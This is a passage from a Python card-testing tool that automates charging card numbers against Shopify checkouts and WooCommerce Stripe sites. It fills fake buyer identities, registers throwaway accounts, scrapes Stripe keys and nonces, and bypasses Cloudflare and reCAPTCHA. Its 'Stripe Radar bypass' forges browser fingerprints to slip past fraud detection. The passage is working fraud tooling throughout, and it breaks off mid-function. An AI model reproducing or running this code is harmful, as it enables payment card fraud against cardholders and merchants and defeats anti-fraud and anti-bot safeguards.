    return f"💀 KILL SUCCESSFUL\n" + "\n".join(results)

# ============================================================================
# SHOPIFY AUTO
# ============================================================================
class ShopifyAuto:
    def __init__(self):
        self.user_agent = UserAgent().random
        self.last_price = None
    
    async def tokenize_card(self, session, cc, mon, year, cvv, first, last):
        try:
            url = "https://deposit.us.shopifycs.com/sessions"
            payload = {
                "credit_card": {
                    "number": str(cc).replace(" ", ""),
                    "name": f"{first} {last}",
                    "month": int(mon),
                    "year": int(year),
                    "verification_value": str(cvv)
                }
            }
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.shopifycs.com',
                'User-Agent': self.user_agent
            }
            r = await session.post(url, json=payload, headers=headers)
            if r.status_code == 200:
                return r.json().get('id')
            return None
        except Exception as e:
            return None

    async def get_random_info(self):
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
            {"add1": "123 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10001"},
            {"add1": "456 Park Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10022"},
            {"add1": "789 Sunset Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90001"},
            {"add1": "321 Hollywood Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
            {"add1": "654 Michigan Ave", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60601"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa", "Robert", "Jennifer", "William", "Maria", "James", "Patricia"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789",
            "3055557890", "7025551234", "6025554567", "2145558901"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

    async def shopify_charge(self, site_url, card):
        try:
            cc, mon, year, cvv = card.split('|')
            
            product_header = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.6',
                'user-agent': self.user_agent,
            }

            async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as session:
                product_response = await session.get(site_url + '/products.json', headers=product_header)
                if product_response.status_code != 200:
                    return "❌ Failed to fetch product info"
                
                products_data = product_response.json()
                if not products_data.get('products'):
                    return "❌ No products found"
                
                product = products_data['products'][0]
                product_handle = product['handle']
                variant_id = product['variants'][0]['id']
                price = product['variants'][0]['price']
                
                await session.get(f"{site_url}/products/{product_handle}", headers=product_header)
                
                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product',
                }
                
                response = await session.post(site_url + '/cart/add.js', headers=product_header, data=add_data)
                if response.status_code != 200:
                    return "❌ Failed to add item to cart"
                
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'upgrade-insecure-requests': '1',
                    'user-agent': self.user_agent,
                }
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                
                checkout_data = {'updates[]': '1'}
                checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data=checkout_data)
                
                response_text = checkout_response.text
                
                session_token_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', response_text)
                session_token = session_token_match.group(1) if session_token_match else None
                
                queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
                paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                missing = []
                if not session_token: missing.append("session_token")
                if not queue_token: missing.append("queue_token") 
                if not stable_id: missing.append("stable_id")
                if not paymentMethodIdentifier: missing.append("paymentMethodIdentifier")
                
                if missing:
                    if 'shopify' not in response_text.lower() and '/cart' not in response_text.lower():
                        return "❌ Site does not appear to be a Shopify store"
                    return f"❌ Missing tokens: {', '.join(missing)}"
                
                random_info = await self.get_random_info()
                
                session_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions", 
                    "https://checkout.shopifycs.com/sessions"
                ]
                
                sessionid = None
                for endpoint in session_endpoints:
                    try:
                        headers = {
                            'authority': urlparse(endpoint).netloc,
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': 'https://checkout.shopifycs.com',
                            'referer': 'https://checkout.shopifycs.com/',
                            'user-agent': self.user_agent,
                        }

                        json_data = {
                            'credit_card': {
                                'number': cc,
                                'month': int(mon),
                                'year': int(year),
                                'verification_value': cvv,
                                'name': f"{random_info['fname']} {random_info['lname']}",
                            },
                            'payment_session_scope': urlparse(site_url).netloc,
                        }

                        session_response = await session.post(endpoint, headers=headers, json=json_data)
                        if session_response.status_code == 200:
                            session_data = session_response.json()
                            if "id" in session_data:
                                sessionid = session_data["id"]
                                break
                    except:
                        continue
                
                if not sessionid:
                    return "❌ Failed to create payment session"
                
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                graphql_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'referer': f"{site_url}/",
                    'user-agent': self.user_agent,
                    'x-checkout-one-session-token': session_token,
                }

                cart_response = await session.get(f"{site_url}/cart.js")
                cart_data = cart_response.json()
                token = cart_data['token']

                random_page_id = str(uuid.uuid4())
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': random_info['add1'],
                                            'address2': '',
                                            'city': random_info['city'],
                                            'countryCode': 'US',
                                            'postalCode': random_info['zip'],
                                            'company': '',
                                            'firstName': random_info['fname'],
                                            'lastName': random_info['lname'],
                                            'zoneCode': random_info['state_short'],
                                            'phone': random_info['phone'],
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                }],
                                'useProgressiveRates': False,
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                }],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': random_info['add1'],
                                                    'address2': '',
                                                    'city': random_info['city'],
                                                    'countryCode': 'US',
                                                    'postalCode': random_info['zip'],
                                                    'company': '',
                                                    'firstName': random_info['fname'],
                                                    'lastName': random_info['lname'],
                                                    'zoneCode': random_info['state_short'],
                                                    'phone': random_info['phone'],
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': random_info['add1'],
                                        'address2': '',
                                        'city': random_info['city'],
                                        'countryCode': 'US',
                                        'postalCode': random_info['zip'],
                                        'company': '',
                                        'firstName': random_info['fname'],
                                        'lastName': random_info['lname'],
                                        'zoneCode': random_info['state_short'],
                                        'phone': random_info['phone'],
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US',
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {'value': random_info['email'], 'emailOrSmsChanged': False},
                                },
                                'marketingConsent': [{'email': {'value': random_info['email']}}],
                                'shopPayOptInPhone': {'countryCode': 'US'},
                            },
                            'taxes': {
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedExemptions': [],
                            },
                        },
                        'attemptToken': f'{uuid.uuid4()}',
                        'metafields': [],
                        'analytics': {'requestUrl': f'{site_url}/checkouts/cn/{uuid.uuid4()}', 'pageId': random_page_id},
                    },
                    'operationName': 'SubmitForCompletion',
                }

                graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                
                if graphql_response.status_code == 200:
                    result_data = graphql_response.json()
                    completion = result_data.get('data', {}).get('submitForCompletion', {})
                    
                    if completion.get('receipt'):
                        receipt_id = completion['receipt'].get('id')
                        
                        poll_payload = {
                            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                            'variables': {'receiptId': receipt_id, 'sessionToken': session_token},
                            'operationName': 'PollForReceipt'
                        }
                        
                        for _ in range(5):
                            await asyncio.sleep(2)
                            poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                            if poll_response.status_code == 200:
                                poll_data = poll_response.json()
                                receipt = poll_data.get('data', {}).get('receipt', {})
                                
                                if receipt.get('__typename') == 'ProcessedReceipt':
                                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                                    return f"✅ AUTO CHARGED - Order ID: {order_id}"
                                elif receipt.get('__typename') == 'ActionRequiredReceipt':
                                    return f"🔐 3DS Required"
                                elif receipt.get('__typename') == 'FailedReceipt':
                                    return f"❌ DECLINED"
                    
                    if completion.get('__typename') == 'Throttled':
                        return "⏳ Processing - Check later"
                    elif completion.get('__typename') == 'SubmitRejected':
                        return f"❌ REJECTED"
                    else:
                        return "❌ UNKNOWN"
                else:
                    return f"❌ GraphQL Error: {graphql_response.status_code}"
                    
        except Exception as e:
            return f"❌ Error: {str(e)}"

def shopify_auto_charge(site_url, card):
    try:
        shop = ShopifyAuto()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(shop.shopify_charge(site_url, card))
        loop.close()
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================================================
# SMART SESSION
# ============================================================================
class SmartSession:
    def __init__(self):
        self.session = None
        self.cookies = {}
        self.stripe_cookies = {
            '__stripe_mid': None,
            '__stripe_sid': None,
            '__stripe_guid': None
        }
        self.last_response = None
        self.used_bypass = False
    
    def create_session(self, use_cloudscraper=False):
        if use_cloudscraper:
            self.session = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
            )
            self.used_bypass = True
            animated_print("[✓] Cloudflare bypass session created", '\033[92m')
        else:
            self.session = requests.session()
            animated_print("[✓] Normal session created", '\033[92m')
        
        if self.cookies:
            self.session.cookies.update(self.cookies)
        
        return self.session
    
    def save_cookies(self):
        if self.session:
            self.cookies = dict(self.session.cookies.get_dict())
            
            for cookie in ['__stripe_mid', '__stripe_sid', '__stripe_guid']:
                if cookie in self.cookies:
                    self.stripe_cookies[cookie] = self.cookies[cookie]
    
    def get_stripe_cookies(self):
        self.save_cookies()
        return {
            'muid': self.stripe_cookies.get('__stripe_mid', str(uuid.uuid4()).replace('-', '')),
            'sid': self.stripe_cookies.get('__stripe_sid', str(uuid.uuid4()).replace('-', '')),
            'guid': self.stripe_cookies.get('__stripe_guid', str(uuid.uuid4()))
        }
    
    def load_cookies(self, cookies_dict):
        self.cookies = cookies_dict
        if self.session:
            self.session.cookies.update(cookies_dict)
    
    def request(self, method, url, **kwargs):
        try:
            if not self.session:
                self.create_session()
            
            response = self.session.request(method, url, **kwargs)
            self.last_response = response
            self.save_cookies()
            
            return response
            
        except Exception as e:
            RED = '\033[91m'
            RESET = '\033[0m'
            print(f"{RED}Request error: {e}{RESET}")
            return None

# ============================================================================
# STRIPE KEY VALIDATOR
# ============================================================================
class StripeKeyValidator:
    @staticmethod
    def is_valid_stripe_key(key):
        if not key:
            return False
        
        if not (key.startswith('pk_live_') or key.startswith('pk_test_')):
            return False
        
        if len(key) < 30:
            return False
        
        key_part = key.replace('pk_live_', '').replace('pk_test_', '')
        if not re.match(r'^[a-zA-Z0-9]+$', key_part):
            return False
        
        return True
    
    @staticmethod
    def extract_stripe_keys(html_content):
        keys = []
        
        pattern1 = r'["\']publishableKey["\']\s*:\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']'
        matches = re.findall(pattern1, html_content)
        keys.extend(matches)
        
        pattern2 = r'(pk_live_[a-zA-Z0-9]{24,})'
        matches = re.findall(pattern2, html_content)
        keys.extend(matches)
        
        pattern3 = r'(pk_test_[a-zA-Z0-9]{24,})'
        matches = re.findall(pattern3, html_content)
        keys.extend(matches)
        
        pattern4 = r'(?:var|let|const)\s+\w*key\w*\s*[=:]\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']'
        matches = re.findall(pattern4, html_content, re.IGNORECASE)
        keys.extend(matches)
        
        return list(set(keys))
    
    @staticmethod
    def test_key_live(key, account_id=None):
        test_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13)'
        }
        
        test_data = f'key={key}'
        if account_id:
            test_data += f'&_stripe_account={account_id}'
        
        try:
            r_test = requests.post('https://api.stripe.com/v1/payment_methods', 
                                   headers=test_headers, 
                                   data=test_data,
                                   timeout=10)
            
            if r_test.status_code == 401:
                error_json = r_test.json()
                error_msg = error_json.get('error', {}).get('message', '')
                
                if 'Invalid API Key' in error_msg:
                    return {'valid': False, 'reason': 'invalid_key', 'message': error_msg}
                elif 'platform' in error_msg:
                    return {'valid': False, 'reason': 'account_mismatch', 'message': error_msg}
                else:
                    return {'valid': False, 'reason': 'unknown', 'message': error_msg}
            
            elif r_test.status_code == 200:
                return {'valid': True, 'reason': 'valid_key', 'message': 'Key is valid'}
            
            else:
                return {'valid': True, 'reason': 'unknown_status', 'message': f'Status: {r_test.status_code}'}
                
        except Exception as e:
            return {'valid': False, 'reason': 'test_error', 'message': str(e)}
    
    @staticmethod
    def find_best_key(html_content, account_id=None):
        candidates = StripeKeyValidator.extract_stripe_keys(html_content)
        
        if not candidates:
            return None
        
        YELLOW = '\033[93m'
        RED = '\033[91m'
        GREEN = '\033[92m'
        RESET = '\033[0m'
        
        print(f"{YELLOW}🔍 NEW STRIPE KEY LOADING...:{RESET}")
        for i, key in enumerate(candidates):
            masked = key[:10] + '*' * (len(key) - 15) + key[-5:]
            print(f"  {i+1}. {masked}")
        
        valid_candidates = [k for k in candidates if StripeKeyValidator.is_valid_stripe_key(k)]
        
        if not valid_candidates:
            print(f"{RED}❌ KEY FORMAT UNSUCCESSFUL{RESET}")
            return candidates[0] if candidates else None
        
        test_key = valid_candidates[0]
        test_result = StripeKeyValidator.test_key_live(test_key, account_id)
        
        if test_result['valid']:
            print(f"{GREEN}✓ Key valid: {test_result['reason']}{RESET}")
            return test_key
        else:
            print(f"{RED}❌ Key test failed: {test_result['message']}{RESET}")
            
            for key in valid_candidates[1:]:
                test_result = StripeKeyValidator.test_key_live(key, account_id)
                if test_result['valid']:
                    print(f"{GREEN}✓ Alternative key valid{RESET}")
                    return key
            
            return valid_candidates[0]

# ============================================================================
# CAPTCHA HANDLER
# ============================================================================
class CaptchaHandler:
    @staticmethod
    def detect_captcha_type(html):
        html_lower = html.lower()
        
        if 'recaptcha' in html_lower and 'data-sitekey' in html:
            sitekey = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if sitekey:
                return {
                    'type': 'recaptcha',
                    'sitekey': sitekey.group(1),
                    'bypassable': True
                }
        
        if 'hcaptcha' in html_lower and 'data-sitekey' in html:
            sitekey = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if sitekey:
                return {
                    'type': 'hcaptcha',
                    'sitekey': sitekey.group(1),
                    'bypassable': False
                }
        
        if 'cf-turnstile' in html_lower or 'turnstile' in html_lower:
            return {
                'type': 'turnstile',
                'bypassable': False
            }
        
        captcha_keywords = ['captcha', 'verify you are human', 'security check']
        if any(keyword in html_lower for keyword in captcha_keywords):
            return {
                'type': 'unknown',
                'bypassable': False
            }
        
        return None
    
    @staticmethod
    def should_bypass(captcha_info):
        if not captcha_info:
            return False
        
        if captcha_info['type'] == 'recaptcha' and captcha_info['bypassable']:
            return True
        
        if captcha_info['type'] in ['hcaptcha', 'turnstile', 'unknown']:
            YELLOW = '\033[93m'
            RESET = '\033[0m'
            print(f"{YELLOW}⚠️ {captcha_info['type'].upper()} detected but ignored (continuing)...{RESET}")
            return False
        
        return False

def recaptcha_bypass(page_html: str, page_url: str) -> str | None:
    captcha_info = CaptchaHandler.detect_captcha_type(page_html)
    
    if not captcha_info or captcha_info['type'] != 'recaptcha':
        YELLOW = '\033[93m'
        RESET = '\033[0m'
        print(f"{YELLOW}⚠️ Not a standard reCAPTCHA, skipping bypass...{RESET}")
        return None
    
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'
    
    animated_print("[*] Standard reCAPTCHA detected, attempting bypass...", YELLOW)
    sitekey = captcha_info['sitekey']
    print(f"{GREEN}✓ Sitekey found: {sitekey}{RESET}")
    
    origin_encoded = "aHR0cHM6Ly93d3cueW91cnNpdGUuY29t"
    anchor_url = f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={sitekey}&co={origin_encoded}&hl=en&v=...&size=invisible"
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"

    req_headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        loading_animation(1)
        
        resp_anchor = requests.get(anchor_url, headers=req_headers, timeout=12)
        resp_anchor.raise_for_status()

        token_match = re.search(r'value=["\']([^"\']+)["\']', resp_anchor.text)
        if not token_match:
            print(f"{RED}❌ Anchor token not found{RESET}")
            return None

        token = token_match.group(1)
        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)

        post_data = {
            'v': params.get('v', [''])[0],
            'reason': 'q',
            'c': token,
            'k': sitekey,
            'co': params.get('co', [''])[0],
            'hl': 'en',
            'size': 'invisible'
        }

        post_headers = req_headers.copy()
        post_headers.update({
            "Referer": resp_anchor.url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.google.com"
        })

        resp_reload = requests.post(reload_url, headers=post_headers, data=post_data, timeout=15)
        resp_reload.raise_for_status()

        rresp_match = re.search(r'\["rresp","([^"]+)"', resp_reload.text)
        if not rresp_match:
            print(f"{RED}❌ Response token not found{RESET}")
            return None

        g_token = rresp_match.group(1)
        print(f"{GREEN}✓ reCAPTCHA bypass successful!{RESET}")
        return g_token

    except Exception as e:
        print(f"{RED}❌ reCAPTCHA bypass error: {e}{RESET}")
        return None

# ============================================================================
# STRIPE RADAR BYPASS
# ============================================================================
class StripeRadarBypass:
    @staticmethod
    def generate_fingerprint():
        return {
            'muid': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'sid': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'guid': str(uuid.uuid4()),
            'time_on_page': random.randint(30000, 180000),
            'screen_resolution': random.choice(['1920x1080', '1366x768', '1536x864']),
            'timezone_offset': random.randint(-480, 600),
            'language': 'en-US',
            'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36'
        }
    
    @staticmethod
    def create_stripe_payload(card_info, pk_live, stripe_cookies=None):
        fp = StripeRadarBypass.generate_fingerprint()
        
        muid = stripe_cookies.get('muid', fp['muid']) if stripe_cookies else fp['muid']
        sid = stripe_cookies.get('sid', fp['sid']) if stripe_cookies else fp['sid']
        guid = stripe_cookies.get('guid', fp['guid']) if stripe_cookies else fp['guid']
        
        client_attribution = {
            "client_session_id": str(uuid.uuid4()),
            "merchant_integration_source": "elements",
            "merchant_integration_subtype": "payment-element",
            "merchant_integration_version": "2021",
            "payment_intent_creation_flow": "deferred",
            "payment_method_selection_flow": "merchant_specified",
            "elements_session_config_id": str(uuid.uuid4())
        }
        
        payload = (
            f'type=card'
            f'&card[number]={card_info["number"]}'
            f'&card[cvc]={card_info["cvc"]}'
            f'&card[exp_year]={card_info["exp_year"]}'
            f'&card[exp_month]={card_info["exp_month"]}'
            f'&billing_details[name]={card_info["name"].replace(" ", "+")}'
            f'&billing_details[email]={card_info["email"]}'
            f'&billing_details[address][country]={card_info["country"]}'
            f'&billing_details[address][postal_code]={card_info.get("zip", "10001")}'
            f'&allow_redisplay=unspecified'
            f'&key={pk_live}'
            f'&muid={muid}'
            f'&sid={sid}'
            f'&guid={guid}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={fp["time_on_page"]}'
            f'&client_attribution_metadata[client_session_id]={client_attribution["client_session_id"]}'
            f'&client_attribution_metadata[merchant_integration_source]={client_attribution["merchant_integration_source"]}'
            f'&client_attribution_metadata[merchant_integration_subtype]={client_attribution["merchant_integration_subtype"]}'
            f'&client_attribution_metadata[merchant_integration_version]={client_attribution["merchant_integration_version"]}'
            f'&client_attribution_metadata[payment_intent_creation_flow]={client_attribution["payment_intent_creation_flow"]}'
            f'&client_attribution_metadata[payment_method_selection_flow]={client_attribution["payment_method_selection_flow"]}'
            f'&client_attribution_metadata[elements_session_config_id]={client_attribution["elements_session_config_id"]}'
        )
        
        return payload, fp
    
    @staticmethod
    def analyze_stripe_response(response_json):
        if 'id' in response_json:
            return {'status': 'success', 'payment_id': response_json['id']}
        
        error = response_json.get('error', {})
        error_msg = error.get('message', 'Unknown error')
        error_code = error.get('code', 'unknown')
        
        if 'radar' in error_msg.lower() or 'fraud' in error_msg.lower():
            return {'status': 'radar_block', 'message': error_msg}
        
        if 'three_d_secure' in error_msg.lower() or '3d_secure' in error_code:
            return {'status': '3ds_required', 'message': error_msg}
        
        if 'incorrect_cvc' in error_msg.lower():
            return {'status': 'cvc_error', 'message': error_msg}
        
        if 'insufficient_funds' in error_msg.lower():
            return {'status': 'insufficient_funds', 'message': error_msg}
        
        if 'card_declined' in error_msg.lower():
            return {'status': 'declined', 'message': error_msg}
        
        if 'invalid api key' in error_msg.lower():
            return {'status': 'invalid_key', 'message': error_msg}
        
        return {'status': 'error', 'message': error_msg, 'code': error_code}

# ============================================================================
# STRIPE AUTO
# ============================================================================
def stripe_auto_charge(site_url, card):
    try:
        BOLD = '\033[1m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RESET = '\033[0m'
        
        animated_print(f"\n{BOLD}[+] WooCommerce Stripe Payment Method Adder starting...{RESET}", CYAN)
        time.sleep(1)
        
        smart_session = SmartSession()
        
        animated_print("\n[*] Checking for Cloudflare protection...", YELLOW)
        try:
            test_response = requests.get(site_url, timeout=10)
            if "cf-chl-captcha" in test_response.text or "cloudflare" in test_response.text.lower():
                animated_print("[!] Cloudflare detected! Creating bypass session...", YELLOW)
                r = smart_session.create_session(use_cloudscraper=True)
            else:
                animated_print("[✓] No Cloudflare protection", GREEN)
                r = smart_session.create_session(use_cloudscraper=False)
        except:
            animated_print("[!] Cloudflare detection failed, using normal session", YELLOW)
            r = smart_session.create_session(use_cloudscraper=False)

        url2 = f'{site_url}/my-account/'
        url4 = f'{site_url}/my-account/add-payment-method/'
        url5 = f'{site_url}/wp-admin/admin-ajax.php'

        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        pas = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        name = ''.join(random.choices(string.ascii_letters, k=10))
        
        animated_print(f"\n[+] Generated account: {email}:{pas}", GREEN)

        USER_AGENTS = [
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        ]
        UA = random.choice(USER_AGENTS)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': UA,
        }

        animated_print("\n[*] Getting register nonce...", CYAN)
        response = r.get(url2, headers=headers, timeout=15)
        
        if response.status_code != 200:
            return f"❌ Cannot access site! Status: {response.status_code}"

        soup = BeautifulSoup(response.text, "html.parser")
        nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
        
        if nonce_tag and 'value' in nonce_tag.attrs:
            reg = nonce_tag['value']
        else:
            return "❌ Register nonce not found!"

        animated_print("\n[*] Starting registration process...", CYAN)
        
        headers_register = headers.copy()
        headers_register.update({
            'Origin': site_url,
            'Referer': f'{site_url}/my-account/',
        })

        data_register = {
            'email': email,
            'password': pas,
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = r.post(f'{site_url}/my-account/', headers=headers_register, data=data_register, timeout=20)
        
        captcha_info = CaptchaHandler.detect_captcha_type(response.text)
        
        if captcha_info:
            if CaptchaHandler.should_bypass(captcha_info):
                g_token = recaptcha_bypass(response.text, f'{site_url}/my-account/')
                if g_token:
                    data_register['g-recaptcha-response'] = g_token
                    response = r.post(f'{site_url}/my-account/', headers=headers_register, data=data_register, timeout=20)

        animated_print("\n[*] Accessing payment method page...", CYAN)
        
        headers_payment = headers.copy()
        headers_payment.update({'Referer': f'{site_url}/my-account/payment-methods/'})

        response = r.get(url4, headers=headers_payment, timeout=15)

        animated_print("\n[*] Searching for Stripe information...", CYAN)
        
        acct_m = re.search(r'["\']accountId["\']\s*:\s*["\'](acct_[a-zA-Z0-9]+)["\']', response.text)
        if not acct_m:
            acct_m = re.search(r'(acct_[a-zA-Z0-9]+)', response.text)
        account_id = acct_m.group(1) if acct_m else None
        
        best_key = StripeKeyValidator.find_best_key(response.text, account_id)
        
        if not best_key:
            return "❌ No Stripe key found!"
        
        pk_live = best_key
        
        nonce_patterns = [
            r'["\']createSetupIntentNonce["\']\s*:\s*["\']([a-z0-9]+)["\']',
            r'["\']createAndConfirmSetupIntentNonce["\']\s*:\s*["\']([a-z0-9]+)["\']',
        ]
        
        addnonce = None
        for pattern in nonce_patterns:
            nonce_m = re.search(pattern, response.text)
            if nonce_m:
                addnonce = nonce_m.group(1)
                break
        
        if not addnonce:
            return "❌ Nonce not found!"

        card_parts = card.split('|')
        if len(card_parts) < 4:
            return "❌ Invalid card format"
        
        card_number = card_parts[0]
        card_exp_month = card_parts[1]
        card_exp_year = card_parts[2]
        card_cvc = card_parts[3]
        
        if len(card_exp_year) == 4:
            card_exp_year = card_exp_year[-2:]

        card_info = {
